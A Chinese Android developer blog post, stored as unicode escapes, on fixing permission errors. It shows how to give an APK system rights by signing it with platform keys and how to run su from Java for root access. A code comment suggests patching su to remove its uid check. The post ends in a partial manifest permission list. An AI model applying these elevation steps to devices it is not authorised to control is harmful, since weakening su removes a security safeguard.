\u6b64\u79cd\u60c5\u51b5\u4e00\u822c\u662fAndroidManifest.xml\u4e2d\u7f3a\u5c11\u76f8\u5e94\u7684\u6743\u9650\u8bbe\u7f6e\uff0c\u597d\u597d\u67e5\u627e\u4e00\u756a\u6743\u9650\u5217\u8868\uff0c\u5e94\u8be5\u5c31\u53ef\u89e3\u51b3\uff0c\u662f\u6700\u6613\u5904\u7406\u7684\u60c5\u51b5\u3002 \u6709\u65f6\u6743\u9650\u90fd\u52a0\u4e0a\u4e86\uff0c\u4f46\u8fd8\u662f\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u662f\u4ec0\u4e48\u60c5\u51b5\u5462\uff1f Android\u7cfb\u7edf\u6709\u4e00\u4e9bAPI\u53ca\u6743\u9650\u662f\u9700\u8981apk\u5177\u6709\u4e00\u5b9a\u7684\u7b49\u7ea7\u624d\u80fd\u8fd0\u884c\u7684\u3002 \u6bd4\u5982 SystemClock.setCurrentTimeMillis()\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0cWRITE_SECURE_SETTINGS\u6743\u9650\u597d\u50cf\u90fd\u662f\u9700\u8981\u6709system\u7ea7\u7684\u6743\u9650\u624d\u884c\u3002 \u4e5f\u5c31\u662f\u8bf4UserID\u662fsystem. \uff082\uff09Log\u91cc\u6ca1\u6709\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u800c\u662f\u4e00\u4e9b\u5176\u4ed6Exception\u7684\u63d0\u793a,\u8fd9\u4e5f\u6709\u53ef\u80fd\u662f\u6743\u9650\u4e0d\u8db3\u9020\u6210\u7684\u3002 \u6bd4\u5982\uff1a\u6211\u4eec\u5e38\u4f1a\u60f3\u8bfb/\u5199\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6216\u5176\u4ed6\u4e00\u4e9b\u4e0d\u662f\u81ea\u5df1\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u5e38\u4f1a\u62a5java.io.FileNotFoundException\u9519\u8bef\u3002 \u7cfb\u7edf\u8ba4\u4e3a\u6bd4\u8f83\u91cd\u8981\u7684\u6587\u4ef6\u4e00\u822c\u6743\u9650\u8bbe\u7f6e\u7684\u4e5f\u4f1a\u6bd4\u8f83\u4e25\u683c\uff0c\u7279\u522b\u662f\u4e00\u4e9b\u5f88\u91cd\u8981\u7684(\u914d\u7f6e)\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u5982 -r--r----- bluetooth bluetooth 935 2010-07-09 20:21 dbus.conf drwxrwx--x system system 2010-07-07 02:05 data dbus.conf\u597d\u50cf\u662f\u84dd\u7259\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u6743\u9650\u4e0a\u6765\u770b\uff0c\u6839\u672c\u5c31\u4e0d\u53ef\u80fd\u6539\u52a8\uff0c\u975ebluetooth\u7528\u6237\u8fde\u8bfb\u7684\u6743\u5229\u90fd\u6ca1\u6709\u3002 /data\u76ee\u5f55\u4e0b\u5b58\u7684\u662f\u6240\u6709\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bandroid\u662f\u4e0d\u5141\u8bb8\u666e\u901aapk\u8bbf\u95ee/data\u76ee\u5f55\u4e0b\u5185\u5bb9\u7684\uff0c\u901a\u8fc7data\u76ee\u5f55\u7684\u6743\u9650\u8bbe\u7f6e\u53ef\u77e5\uff0c\u5176\u4ed6\u7528\u6237\u6ca1\u6709\u8bfb\u7684\u6743\u9650\u3002 \u6240\u4ee5adb\u666e\u901a\u6743\u9650\u4e0b\u5728data\u76ee\u5f55\u4e0b\u6572ls\u547d\u4ee4\uff0c\u4f1a\u5f97\u5230 opendir failed, Permission denied \u7684\u9519\u8bef\uff0c\u901a\u8fc7\u4ee3\u7801file.listfiles()\u4e5f\u65e0\u6cd5\u83b7\u5f97data\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\u3002 \u4e0a\u9762\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u90fd\u9700\u8981\u63d0\u5347apk\u7684\u6743\u9650\uff0c\u76ee\u524d\u6211\u6240\u77e5\u7684apk\u80fd\u63d0\u5347\u5230\u7684\u6743\u9650\u5c31\u662fsystem\uff08\u5177\u4f53\u65b9\u6cd5\u89c1\uff1a\u5982\u4f55\u4f7fAndroid\u5e94\u7528\u7a0b\u5e8f\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\uff09, \u600e\u6837\u4f7fandroid apk \u83b7\u53d6system\u6743\u9650 \u6700\u8fd1\u5728\u56de\u7b54\u5ba2\u6237\u7684\u95ee\u9898\u65f6\uff0c\u63d0\u5230\u600e\u4e48\u5c06apk \u5347\u7ea7\u5230root\u6743\u9650\u3002 1.\u4e00\u822c\u6743\u9650\u7684\u6dfb\u52a0 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8bbe\u5b9aapk\u7684\u6743\u9650\uff0c\u53ef\u5728AndroidManifest.xml\u4e2d\u6dfb\u52a0android:sharedUserId=\"android.uid.xxx> \u4f8b\u5982\uff1a \u7ed9apk\u6dfb\u52a0system\u6743\u9650 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" ... ... android:sharedUserId=\"android.uid.system\"> \u540c\u65f6\u8fd8\u9700\u8981\u5728\u5bf9\u5e94\u7684Android.mk\u4e2d\u6dfb\u52a0LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u9879\u3002\u5373\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ea\u80fd\u4f7fapk\u7684\u6743\u9650\u5347\u7ea7\u5230system\u7ea7\u522b\uff0c\u7cfb\u7edf\u4e2d\u8981\u6c42root\u6743\u9650\u624d\u80fd\u8bbf\u95ee\u7684\u6587\u4ef6\uff0capk\u8fd8\u662f\u4e0d\u80fd\u8bbf\u95ee\u3002 \u6bd4\u5982\u5728android \u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u662f\u76f4\u63a5\u628aeclipse\u7f16\u51fa\u6765\u7684apk\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\u6587\u4ef6\u7b7e\u540d 1. \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211ndroid\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build/target/product/security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build/tools/signapk\"\u4e0b\uff0c\u7f16\u8bd1\u540e\u5728out/host/linux-x86/framework\u4e0b\uff0c\u7528\u6cd5\u4e3ajava -jar signapk.jar platform.x509.pem platform.pk8 input.apk output.apk\"\u3002 \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002 \u600e\u6837\u4f7fandroid apk \u83b7\u53d6root\u6743\u9650 \u4e00\u822clinux \u83b7\u53d6root\u6743\u9650\u662f\u901a\u8fc7\u6267\u884csu\u547d\u4ee4\uff0c\u90a3\u80fd\u4e0d\u80fd\u5728apk\u7a0b\u5e8f\u4e2d\u4e5f\u540c\u6837\u6267\u884c\u4e00\u4e0b\u8be5\u547d\u4ee4\u5462\uff0c\u6211\u4eec\u77e5\u9053\u5728linux\u7f16\u7a0b\u4e2d\uff0c\u6709exec\u51fd\u6570\u65cf\uff1a \u3000\u3000int execl(c[ON](http://www.dzsc.com/data/iccompany/detail12.html)st char *path, const char *arg, ...); \u3000\u3000int execlp(const char *file, const char *arg, ...); \u3000\u3000int execle(const char *path, const char *arg, ..., char *const envp[]); \u3000\u3000int execv(const char *path, char *const argv[]); \u3000\u3000int execvp(const char *file, char *const argv[]); \u3000\u3000int execve(const char *path, char *const argv[], char *const envp[]); \u5728java\u4e2d\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff Runtime.getRuntime().exec([String](http://www.coderanch.com/t/410859/java/java/String-StringBuffer-StringBuilder-Performance \"String vs. StringBuilder/StringBuffer\") command) \u8bbf\u95ee\u5e95\u5c42Linux\u4e0b\u7684\u7a0b\u5e8f\u6216\u811a\u672c\uff0c\u8fd9\u6837\u5c31\u80fd\u6267\u884csu\u547d\u4ee4\uff0c\u4f7fapk\u5177\u6709root\u6743\u9650\uff0c\u80fd\u591f\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u9700\u8981root\u6743\u9650\u624d\u80fd\u6267\u884c\u7684\u7a0b\u5e8f\u6216\u811a\u672c\u4e86\uff0c\u5177\u4f53\u4f8b\u5b50\uff1a package com.visit.dialoglog; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.IOException; import android.app.Activity; import android.os.Bundle; import android.util.Log; public class VisitRootfileActivity extends Activity { private static final String TAG = \"VisitRootfileActivity\"; Process process = null; Process process1 = null; DataOutputStream os = null; DataInputStream is = null; /** Called when the activity is first created. */ @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); try { process = Runtime.getRuntime().exec(\"/system/xbin/su\"); /*\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u4fee\u6539su \u7684\u6e90\u4ee3\u7801 \uff08\u6ce8\u6389 if (myuid != AID_ROOT && myuid != AID_SHELL) {*/ os = new DataOutputStream(process.getOutputStream()); is = new DataInputStream(process.getInputStream()); os.writeBytes(\"/system/bin/ls\" + \" \\n\"); //\u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u5177\u6709root \u6743\u9650\u7684\u7a0b\u5e8f\u4e86 os.writeBytes(\" exit \\n\"); os.flush(); process.waitFor(); } catch (Exception e) { Log.e(TAG, \"Unexpected error - Here is what I know:\" + e.getMessage()); } finally { try { if (os != null) { os.close(); } if (is != null) { is.close(); } process.destroy(); } catch (Exception e) { } }// get the root privileges } } APK\u5728AndroidManifest.xml\u5e38\u7528\u6743\u9650 android.permission.ACCESS_CHECKIN_PROPERTIES //\u5141\u8bb8\u8bfb\u5199\u8bbf\u95ee\u201dproperties\u201d\u8868\u5728checkin\u6570\u636e\u5e93\u4e2d\uff0c\u6539\u503c\u53ef\u4ee5\u4fee\u6539\u4e0a\u4f20 android.permission.ACCESS_COARSE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95eeCellID\u6216WiFi\u70ed\u70b9\u6765\u83b7\u53d6\u7c97\u7565\u7684\u4f4d\u7f6e android.permission.ACCESS_FINE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u7cbe\u826f\u4f4d\u7f6e(\u5982GPS) android.permission.ACCESS_LOCATION_EXTRA_COMMANDS //\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u989d\u5916\u7684\u4f4d\u7f6e\u63d0\u4f9b\u547d\u4ee4 android.permission.ACCESS_MOCK_LOCATION //\u5141\u8bb8\u7a0b\u5e8f\u521b\u5efa\u6a21\u62df\u4f4d\u7f6e\u63d0\u4f9b\u7528\u4e8e\u6d4b\u8bd5 android.permission.ACCESS_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95ee\u6709\u5173GSM\u7f51\u7edc\u4fe1\u606f android.permission.ACCESS_SURFACE_FLINGER //\u5141\u8bb8\u7a0b\u5e8f\u4f7f\u7528SurfaceFlinger\u5e95\u5c42\u7279\u6027 android.permission.ACCESS_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95eeWi-Fi\u7f51\u7edc\u72b6\u6001\u4fe1\u606f android.permission.ADD_SYSTEM_SERVICE //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u5e03\u7cfb\u7edf\u7ea7\u670d\u52a1 android.permission.BATTERY_STATS //\u5141\u8bb8\u7a0b\u5e8f\u66f4\u65b0\u624b\u673a\u7535\u6c60\u7edf\u8ba1\u4fe1\u606f android.permission.BLUETOOTH //\u5141\u8bb8\u7a0b\u5e8f\u8fde\u63a5\u5230\u5df2\u914d\u5bf9\u7684\u84dd\u7259\u8bbe\u5907 android.permission.BLUETOOTH_ADMIN //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u73b0\u548c\u914d\u5bf9\u84dd\u7259\u8bbe\u5907 android.permission.BRICK //\u8bf7\u6c42\u80fd\u591f\u7981\u7528\u8bbe\u5907(\u975e\u5e38\u5371\u9669 android.permission.BROADCAST_PACKAGE_REMOVED //\u5141\u8bb8\u7a0b\u5e8f\u5e7f\u64ad\u4e00\u4e2a\u63d0\u793a\u6d88\u606f\u5728\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5305\u5df2\u7ecf\u79fb\u9664\u540e android.permission.BROADCAST_STICKY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5e7f\u64ad\u5e38\u7528intents android.permission.CALL_PHONE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u521d\u59cb\u5316\u4e00\u4e2a\u7535\u8bdd\u62e8\u53f7\u4e0d\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CALL_PRIVILEGED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u62e8\u6253\u4efb\u4f55\u53f7\u7801\uff0c\u5305\u542b\u7d27\u6025\u53f7\u7801\u65e0\u9700\u901a\u8fc7\u62e8\u53f7\u7528\u6237\u754c\u9762\u9700\u8981\u7528\u6237\u786e\u8ba4 android.permission.CAMERA //\u8bf7\u6c42\u8bbf\u95ee\u4f7f\u7528\u7167\u76f8\u8bbe\u5907 android.permission.CHANGE_COMPONENT_ENABLED_STATE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u662f\u5426\u6539\u53d8\u4e00\u4e2a\u7ec4\u4ef6\u6216\u5176\u4ed6\u7684\u542f\u7528\u6216\u7981\u7528 android.permission.CHANGE_CONFIGURATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5f53\u524d\u8bbe\u7f6e\uff0c\u5982\u672c\u5730\u5316 android.permission.CHANGE_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8\u7f51\u7edc\u8fde\u63a5\u72b6\u6001 android.permission.CHANGE_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Wi-Fi\u8fde\u63a5\u72b6\u6001 android.permission.CLEAR_APP_CACHE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u695a\u7f13\u5b58\u4ece\u6240\u6709\u5b89\u88c5\u7684\u7a0b\u5e8f\u5728\u8bbe\u5907\u4e2d android.permission.CLEAR_APP_USER_DATA //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6e05\u9664\u7528\u6237\u8bbe\u7f6e android.permission.CONTROL_LOCATION_UPDATES //\u5141\u8bb8\u542f\u7528\u7981\u6b62\u4f4d\u7f6e\u66f4\u65b0\u63d0\u793a\u4ece\u65e0\u7ebf\u6a21\u5757 android.permission.DELETE_CACHE_FILES //\u5141\u8bb8\u7a0b\u5e8f\u5220\u9664\u7f13\u5b58\u6587\u4ef6 android.permission.DELETE_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5220\u9664\u5305 android.permission.DEVICE_POWER //\u5141\u8bb8\u8bbf\u95ee\u5e95\u5c42\u7535\u6e90\u7ba1\u7406 android.permission.DIAGNOSTIC //\u5141\u8bb8\u7a0b\u5e8fRW\u8bca\u65ad\u8d44\u6e90 android.permission.DISABLE_KEYGUARD //\u5141\u8bb8\u7a0b\u5e8f\u7981\u7528\u952e\u76d8\u9501 android.permission.DUMP //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u72b6\u6001\u6293\u53d6\u4fe1\u606f\u4ece\u7cfb\u7edf\u670d\u52a1 android.permission.EXPAND_STATUS_BAR //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u6269\u5c55\u6536\u7f29\u5728\u72b6\u6001\u680f,android\u5f00\u53d1\u7f51\u63d0\u793a\u5e94\u8be5\u662f\u4e00\u4e2a\u7c7b\u4f3cWindows Mobile\u4e2d\u7684\u6258\u76d8\u7a0b\u5e8f android.permission.FACTORY_TEST //\u4f5c\u4e3a\u4e00\u4e2a\u5de5\u5382\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u8fd0\u884c\u5728root\u7528\u6237 android.permission.FLASHLIGHT //\u8bbf\u95ee\u95ea\u5149\u706f,android\u5f00\u53d1\u7f51\u63d0\u793aHTC Dream\u4e0d\u5305\u542b\u95ea\u5149\u706f android.permission.FORCE_BACK //\u5141\u8bb8\u7a0b\u5e8f\u5f3a\u884c\u4e00\u4e2a\u540e\u9000\u64cd\u4f5c\u662f\u5426\u5728\u9876\u5c42activities android.permission.FOTA_UPDATE //\u6682\u65f6\u4e0d\u4e86\u89e3\u8fd9\u662f\u505a\u4ec0\u4e48\u4f7f\u7528\u7684\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u4e00\u4e2a\u9884\u7559\u6743\u9650. android.permission.GET_ACCOUNTS //\u8bbf\u95ee\u4e00\u4e2a\u5e10\u6237\u5217\u8868\u5728Accounts Service\u4e2d android.permission.GET_PACKAGE_SIZE //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4efb\u4f55package\u5360\u7528\u7a7a\u95f4\u5bb9\u91cf android.permission.GET_TASKS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u83b7\u53d6\u4fe1\u606f\u6709\u5173\u5f53\u524d\u6216\u6700\u8fd1\u8fd0\u884c\u7684\u4efb\u52a1\uff0c\u4e00\u4e2a\u7f29\u7565\u7684\u4efb\u52a1\u72b6\u6001\uff0c\u662f\u5426\u6d3b\u52a8\u7b49\u7b49 android.permission.HARDWARE_TEST //\u5141\u8bb8\u8bbf\u95ee\u786c\u4ef6 android.permission.INJECT_EVENTS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u622a\u83b7\u7528\u6237\u4e8b\u4ef6\u5982\u6309\u952e\u3001\u89e6\u6478\u3001\u8f68\u8ff9\u7403\u7b49\u7b49\u5230\u4e00\u4e2a\u65f6\u95f4\u6d41\uff0candroid\u5f00\u53d1\u7f51\u63d0\u9192\u7b97\u662fhook\u6280\u672f\u5427 android.permission.INSTALL_PACKAGES //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5b89\u88c5packages android.permission.INTERNAL_SYSTEM_WINDOW //\u5141\u8bb8\u6253\u5f00\u7a97\u53e3\u4f7f\u7528\u7cfb\u7edf\u7528\u6237\u754c\u9762 android.permission.INTERNET //\u5141\u8bb8\u7a0b\u5e8f\u6253\u5f00\u7f51\u7edc\u5957\u63a5\u5b57 android.permission.MANAGE_APP_TOKENS //\u5141\u8bb8\u7a0b\u5e8f\u7ba1\u7406(\u521b\u5efa\u3001\u50ac\u540e\u3001 z- order\u9ed8\u8ba4\u5411z\u8f74\u63a8\u79fb)\u7a0b\u5e8f\u5f15\u7528\u5728\u7a97\u53e3\u7ba1\u7406\u5668\u4e2d android.permission.MASTER_CLEAR //\u76ee\u524d\u8fd8\u6ca1\u6709\u660e\u786e\u7684\u89e3\u91ca\uff0candroid\u5f00\u53d1\u7f51\u5206\u6790\u53ef\u80fd\u662f\u6e05\u9664\u4e00\u5207\u6570\u636e\uff0c\u7c7b\u4f3c\u786c\u683c\u673a android.permission.MODIFY_AUDIO_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u4fee\u6539\u5168\u5c40\u97f3\u9891\u8bbe\u7f6e android.permission.MODIFY_PHONE_STATE //\u5141\u8bb8\u4fee\u6539\u8bdd\u673a\u72b6\u6001\uff0c\u5982\u7535\u6e90\uff0c\u4eba\u673a\u63a5\u53e3\u7b49 android.permission.MOUNT_UNMOUNT_FILESYSTEMS //\u5141\u8bb8\u6302\u8f7d\u548c\u53cd\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u53ef\u79fb\u52a8\u5b58\u50a8 android.permission.PERSISTENT_ACTIVITY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbe\u7f6e\u4ed6\u7684activities\u663e\u793a android.permission.PROCESS_OUTGOING_CALLS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u89c6\u3001\u4fee\u6539\u6709\u5173\u64ad\u51fa\u7535\u8bdd android.permission.READ_CALENDAR //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u65e5\u5386\u6570\u636e android.permission.READ_CONTACTS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u7528\u6237\u8054\u7cfb\u4eba\u6570\u636e android.permission.READ_FRAME_BUFFER //\u5141\u8bb8\u7a0b\u5e8f\u5c4f\u5e55\u6ce2\u6216\u548c\u66f4\u591a\u5e38\u89c4\u7684\u8bbf\u95ee\u5e27\u7f13\u51b2\u6570\u636e android.permission.READ_INPUT_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8fd4\u56de\u5f53\u524d\u6309\u952e\u72b6\u6001 android.permission.READ_LOGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u5e95\u5c42\u7cfb\u7edf\u65e5\u5fd7\u6587\u4ef6 android.permission.READ_OWNER_DATA //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u6240\u6709\u8005\u6570\u636e android.permission.READ_SMS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u77ed\u4fe1\u606f android.permission.READ_SYNC_SETTINGS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u8bbe\u7f6e android.permission.READ_SYNC_STATS //\u5141\u8bb8\u7a0b\u5e8f\u8bfb\u53d6\u540c\u6b65\u72b6\u6001 android.permission.REBOOT //\u8bf7\u6c42\u80fd\u591f\u91cd\u65b0\u542f\u52a8\u8bbe\u5907 android.permission.RECEIVE_BOOT_COMPLETED //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u63a5\u6536\u5230 android.permission.RECEIVE_MMS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230MMS\u5f69\u4fe1,\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_SMS //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u4e00\u4e2a\u5c06\u6536\u5230\u77ed\u4fe1\u606f\uff0c\u8bb0\u5f55\u6216\u5904\u7406 android.permission.RECEIVE_WAP_PUSH //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u5c06\u6536\u5230WAP PUSH\u4fe1\u606f android.permission.RECORD_AUDIO //\u5141\u8bb8\u7a0b\u5e8f\u5f55\u5236\u97f3\u9891 android.permission.REORDER_TASKS //\u5141\u8bb8\u7a0b\u5e8f\u6539\u53d8Z\u8f74\u6392\u5217\u4efb\u52a1 android.permission.RESTART_PACKAGES //\u5141\u8bb8\u7a0b\u5e8f\u91cd\u65b0\u542f\u52a8\u5176\u4ed6\u7a0b\u5e8f android.permission.SEND_SMS //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u9001SMS\u77ed\u4fe1 android.permission.SET_ACTIVITY_WATCHER //\u5141\u8bb8\u7a0b\u5e8f\u76d1\u63a7\u6216\u63a7\u5236activities\u5df2\u7ecf\u542f\u52a8\u5168\u5c40\u7cfb\u7edf\u4e2d android.permission.SET_ALWAYS_FINISH //\u5141\u8bb8\u7a0b\u5e8f\u63a7\u5236\u662f\u5426\u6d3b\u52a8\u95f4\u63a5\u5b8c\u6210\u5728\u5904\u4e8e\u540e\u53f0\u65f6 android.permission.SET_ANIMATION_SCALE //\u4fee\u6539\u5168\u5c40\u4fe1\u606f\u6bd4\u4f8b android.permission.SET_DEBUG_APP //\u914d\u7f6e\u4e00\u4e2a\u7a0b\u5e8f\u7528\u4e8e\u8c03\u8bd5 android.permission.SET_ORIENTATION //\u5141\u8bb8\u5e95\u5c42\u8bbf\u95ee\u8bbe\u7f6e\u5c4f\u5e55\u65b9\u5411\u548c\u5b9e\u9645\u65cb\u8f6c android.permission.SET_PREFERRED_APPLICATIONS //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u4fee\u6539\u5217\u8868\u53c2\u6570PackageManager.addPackageToPreferred()\u548cPackageManager.removePackageFromPreferred()\u65b9\u6cd5 android.permission.SET_PROCESS_FOREGROUND 